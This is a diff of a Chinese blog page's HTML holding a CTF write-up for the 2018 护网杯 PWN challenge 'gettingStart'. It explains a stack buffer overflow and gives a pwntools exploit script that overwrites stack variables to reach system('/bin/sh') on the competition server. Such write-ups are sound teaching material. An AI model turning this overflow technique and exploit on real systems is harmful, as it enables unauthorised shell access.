@@ -1,9 +1,9 @@
 <!DOCTYPE html>
-<html  lang="zh">
-<head>
+<html lang="zh">
+<head><meta name="generator" content="Hexo 3.9.0">
     <meta charset="utf-8">
 <title>2018护网杯PWN题解 - Hvnt3r&#39;s Blog</title>
-<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 
 
 
@@ -100,20 +100,15 @@
             
             <div class="navbar-start">
                 
-                <a class="navbar-item"
-                href="/">主页</a>
+                <a class="navbar-item" href="/">主页</a>
                 
-                <a class="navbar-item"
-                href="/archives/">归档</a>
+                <a class="navbar-item" href="/archives/">归档</a>
                 
-                <a class="navbar-item"
-                href="/categories/">分类</a>
+                <a class="navbar-item" href="/categories/">分类</a>
                 
-                <a class="navbar-item"
-                href="/tags/">标签</a>
+                <a class="navbar-item" href="/tags/">标签</a>
                 
-                <a class="navbar-item"
-                href="/about/">关于我</a>
+                <a class="navbar-item" href="/about/">关于我</a>
                 
             </div>
             
@@ -176,22 +171,22 @@
         </h1>
         <div class="content">
             <p>这次的护网杯大佬云集，可能很多企业是冲着工业互联网这个招牌去的但是初赛却是学生们玩的比较多的传统CTF。。</p>
-<h2 id="gettingStart"><a href="#gettingStart" class="headerlink" title="gettingStart"></a>gettingStart</h2><p><img src="https://i.loli.net/2018/10/15/5bc3e66225eae.png" alt=""></p>
+<h2 id="gettingStart"><a href="#gettingStart" class="headerlink" title="gettingStart"></a>gettingStart</h2><p><img src="https://i.loli.net/2018/10/15/5bc3e66225eae.png" alt></p>
 <p><a href="https://github.com/Hvnt3r/challenges/raw/master/CTF/2018/%E6%8A%A4%E7%BD%91%E6%9D%AF%E8%B5%9B%E9%A2%98/PWN/gettingStart/task_gettingStart_ktQeERc" target="_blank" rel="noopener">题目下载地址</a></p>
 <p>第一道PWN题还是很简单的，写到脸上的溢出，先看一下文件信息</p>
 <a id="more"></a>
-<p><img src="https://i.loli.net/2018/10/15/5bc3e6b8d011f.png" alt=""></p>
-<p><img src="https://i.loli.net/2018/10/15/5bc3e7035e242.png" alt=""></p>
+<p><img src="https://i.loli.net/2018/10/15/5bc3e6b8d011f.png" alt></p>
+<p><img src="https://i.loli.net/2018/10/15/5bc3e7035e242.png" alt></p>
 <p>64位的可执行ELF文件，且开启了NX和CANARY，放到IDA里看一下：</p>
-<p><img src="https://i.loli.net/2018/10/15/5bc3e87b6d4e9.png" alt=""></p>
-<p>可以在main函数里找到一些关键信息，程序的逻辑是<img src="https://i.loli.net/2018/10/15/5bc3e8dfe8923.png" alt=""></p>
+<p><img src="https://i.loli.net/2018/10/15/5bc3e87b6d4e9.png" alt></p>
+<p>可以在main函数里找到一些关键信息，程序的逻辑是<img src="https://i.loli.net/2018/10/15/5bc3e8dfe8923.png" alt></p>
 <p>关键点在于这个<code>if</code>语句如果想执行else语句中的<code>system(&quot;/bin/sh&quot;);</code>，需要使得<code>v7</code>的值为<code>0x7FFFFFFFFFFFFFFFLL</code>且<code>v8</code> 的值为<code>0.1</code></p>
 <p>而<code>v7</code>的值已经满足条件，但是<code>v8</code>的值需要我们修改，然后看到这里有一个<code>read</code>函数，此函数会从输入缓冲区中读取<code>28H</code>个字节到<code>buf</code>中，但根据如下信息可知</p>
 <figure class="highlight c hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">__int64 buf; <span class="hljs-comment">// [rsp+10h] [rbp-30h]</span></span><br><span class="line">__int64 v5; <span class="hljs-comment">// [rsp+18h] [rbp-28h]</span></span><br><span class="line">__int64 v6; <span class="hljs-comment">// [rsp+20h] [rbp-20h]</span></span><br><span class="line">__int64 v7; <span class="hljs-comment">// [rsp+28h] [rbp-18h]</span></span><br><span class="line"><span class="hljs-keyword">double</span> v8; <span class="hljs-comment">// [rsp+30h] [rbp-10h]</span></span><br><span class="line"><span class="hljs-keyword">unsigned</span> __int64 v9; <span class="hljs-comment">// [rsp+38h] [rbp-8h]</span></span><br></pre></td></tr></table></figure>
 <p>实际的<code>buf</code>的空间只有<code>30H-28H=8H</code>的大小，显然会溢出<code>40-8=32</code>个字节的大小，而我们的目的时修改<code>v8</code>的值，v8的值位于<code>[rbp-10h]~[rbp-8h]</code>内，因此我们需要构造<code>30H-18H=24</code>个字节的任意字符串填充v7前面的栈空间，并用<code>0x7FFFFFFFFFFFFFFFLL</code>填充<code>v7</code>，并用<code>0.1</code>在栈中的存储形式来填充v8即可达成条件从而执行<code>/bin/sh</code>我们需要搞清楚<code>double</code>型的<code>0.1</code>在内存中时如何存储的，<a href="https://math.stackexchange.com/questions/1791562/converting-0-1-to-binary-64-bit-double" target="_blank" rel="noopener">参考链接</a>,如果不知道其实可以直接自己写一个c程序然后调试一下得到，比如如下c代码</p>
 <figure class="highlight c hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span></span><br><span class="line"><span class="hljs-function"></span>&#123;</span><br><span class="line"><span class="hljs-keyword">double</span> v1=<span class="hljs-number">0.1</span>;</span><br><span class="line"><span class="hljs-keyword">double</span> v2;</span><br><span class="line"><span class="hljs-built_in">printf</span>(<span class="hljs-string">"input\n"</span>);</span><br><span class="line"><span class="hljs-built_in">scanf</span>(<span class="hljs-string">"%f"</span>,&amp;v2);</span><br><span class="line"><span class="hljs-built_in">printf</span>(<span class="hljs-string">"%f,%f"</span>,v1,v2);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <p><code>gcc</code>编译一下再用<code>gdb</code>观察栈中的数据变化即可得到，题目所给的程序的<code>data</code>段中也可以直接找到</p>
-<p><img src="https://i.loli.net/2018/10/15/5bc40746c46bd.png" alt=""></p>
+<p><img src="https://i.loli.net/2018/10/15/5bc40746c46bd.png" alt></p>
 <p>因此可得<code>payload</code></p>
 <figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *</span><br><span class="line"><span class="hljs-comment">#p=process("./task_gettingStart_ktQeERc")</span></span><br><span class="line">p=remote(<span class="hljs-string">"117.78.26.12"</span>,<span class="hljs-number">32117</span>)</span><br><span class="line">payload=<span class="hljs-string">""</span></span><br><span class="line">payload+=<span class="hljs-string">"A"</span>*<span class="hljs-number">24</span>+p64(<span class="hljs-number">0x7FFFFFFFFFFFFFFF</span>)+p64(<span class="hljs-number">0x3FB999999999999A</span>)</span><br><span class="line">cmd=<span class="hljs-string">"cat flag\n"</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">print</span> p.recv()</span><br><span class="line"><span class="hljs-keyword">print</span> payload</span><br><span class="line">p.send(payload)</span><br><span class="line"><span class="hljs-keyword">print</span> p.recv()</span><br><span class="line">p.send(cmd)</span><br><span class="line">p.interactive()</span><br><span class="line"><span class="hljs-keyword">print</span> p.recv()</span><br></pre></td></tr></table></figure>
 <p>得到<code>flag</code>：</p>
@@ -370,36 +365,31 @@
         
         <div class="level is-mobile">
             
-            <a class="level-item button is-white is-marginless" target="_blank"
-                title="Github" href="https://github.com/Hvnt3r">
+            <a class="level-item button is-white is-marginless" target="_blank" title="Github" href="https://github.com/Hvnt3r">
                 
                 <i class="fab fa-github"></i>
                 
             </a>
             
-            <a class="level-item button is-white is-marginless" target="_blank"
-                title="Facebook" href="https://facebook.com">
+            <a class="level-item button is-white is-marginless" target="_blank" title="Facebook" href="https://facebook.com">
                 
                 <i class="fab fa-facebook"></i>
                 
             </a>
             
-            <a class="level-item button is-white is-marginless" target="_blank"
-                title="Twitter" href="https://twitter.com">
+            <a class="level-item button is-white is-marginless" target="_blank" title="Twitter" href="https://twitter.com">
                 
                 <i class="fab fa-twitter"></i>
                 
             </a>
             
-            <a class="level-item button is-white is-marginless" target="_blank"
-                title="Dribbble" href="https://dribbble.com">
+            <a class="level-item button is-white is-marginless" target="_blank" title="Dribbble" href="https://dribbble.com">
                 
                 <i class="fab fa-dribbble"></i>
                 
             </a>
             
-            <a class="level-item button is-white is-marginless" target="_blank"
-                title="RSS" href="https://hvnt3r.top/atom.xml">
+            <a class="level-item button is-white is-marginless" target="_blank" title="RSS" href="https://hvnt3r.top/atom.xml">
                 
                 <i class="fas fa-rss"></i>
                 
@@ -2312,8 +2302,7 @@
                 </a>
                 <p class="is-size-7">
                 &copy; 2019 Hvnt3r&nbsp;
-                Powered by <a href="https://hexo.io/" target="_blank">Hexo</a> & <a
-                        href="https://github.com/ppoffice/hexo-theme-icarus" target="_blank">Icarus</a>
+                Powered by <a href="https://hexo.io/" target="_blank">Hexo</a> & <a href="https://github.com/ppoffice/hexo-theme-icarus" target="_blank">Icarus</a>
                 
                 </p>
             </div>
@@ -2449,7 +2438,7 @@ document.addEventListener('DOMContentLoaded', function () {
     <div class="searchbox ins-search">
     <div class="searchbox-container ins-search-container">
         <div class="searchbox-input-wrapper">
-            <input type="text" class="searchbox-input ins-search-input" placeholder="想要查找什么..." />
+            <input type="text" class="searchbox-input ins-search-input" placeholder="想要查找什么...">
             <span class="searchbox-close ins-close ins-selectable"><i class="fa fa-times-circle"></i></span>
         </div>
         <div class="searchbox-result-wrapper ins-section-wrapper">
@@ -2476,5 +2465,5 @@ document.addEventListener('DOMContentLoaded', function () {
 <link rel="stylesheet" href="/css/search.css">
 <link rel="stylesheet" href="/css/insight.css">
     
-<script src="/live2dw/lib/L2Dwidget.min.js?0c58a1486de42ac6cc1c59c7d98ae887"></script><script>L2Dwidget.init({"pluginModelPath":"assets/","model":{"jsonPath":"/live2dw/assets/koharu.model.json"},"display":{"position":"right","width":100,"height":200},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginModelPath":"assets/","model":{"jsonPath":"live2d-widget-model-koharu"},"display":{"position":"right","width":100,"height":200},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
 </html>
